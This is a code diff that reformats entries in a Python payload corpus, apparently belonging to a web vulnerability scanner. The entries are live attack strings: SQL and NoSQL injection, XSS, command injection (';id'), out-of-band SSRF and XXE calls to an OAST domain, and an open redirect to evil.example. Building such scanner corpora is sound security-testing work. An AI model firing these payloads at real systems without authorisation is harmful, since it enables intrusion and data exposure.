@@ -27,8 +27,13 @@ CORPUS: tuple[Payload, ...] = (
     Payload("'", "sqli", "sql", frozenset({"error"})),
     Payload("' OR '1'='1", "sqli", "sql", frozenset({"boolean"})),
     Payload("1' AND SLEEP(5)-- -", "sqli", "sql", frozenset({"time"})),
-    Payload("1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'." + OAST_DOMAIN + "'))",
-            "sqli", "sql", frozenset({"oob"}), oob=True),
+    Payload(
+        "1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'." + OAST_DOMAIN + "'))",
+        "sqli",
+        "sql",
+        frozenset({"oob"}),
+        oob=True,
+    ),
     # NoSQL injection
     Payload('{"$ne": null}', "nosqli", "nosql", frozenset({"auth-bypass"})),
     Payload("[$gt]=", "nosqli", "nosql", frozenset({"operator"})),
@@ -36,8 +41,13 @@ CORPUS: tuple[Payload, ...] = (
     Payload("<script>alert(1)</script>", "xss", "html", frozenset({"reflected"})),
     Payload('"><svg onload=alert(1)>', "xss", "attr", frozenset({"attr-break"})),
     Payload("';alert(1)//", "xss", "js", frozenset({"js-context"})),
-    Payload('<img src=x onerror="fetch(\'' + OAST_URL + "')\">", "xss", "html",
-            frozenset({"blind", "oob"}), oob=True),
+    Payload(
+        "<img src=x onerror=\"fetch('" + OAST_URL + "')\">",
+        "xss",
+        "html",
+        frozenset({"blind", "oob"}),
+        oob=True,
+    ),
     # OS command injection
     Payload(";id", "cmdi", "os", frozenset({"separator"})),
     Payload("|id", "cmdi", "os", frozenset({"pipe"})),
@@ -57,9 +67,13 @@ CORPUS: tuple[Payload, ...] = (
     Payload("http://" + OAST_DOMAIN + "/", "ssrf", "url", frozenset({"blind", "oob"}), oob=True),
     # XXE
     Payload(
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://' + OAST_DOMAIN
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://'
+        + OAST_DOMAIN
         + '/x">]><r>&x;</r>',
-        "xxe", "xml", frozenset({"blind", "oob"}), oob=True,
+        "xxe",
+        "xml",
+        frozenset({"blind", "oob"}),
+        oob=True,
     ),
     # Open redirect
     Payload("//evil.example", "open_redirect", "url", frozenset({"protocol-relative"})),
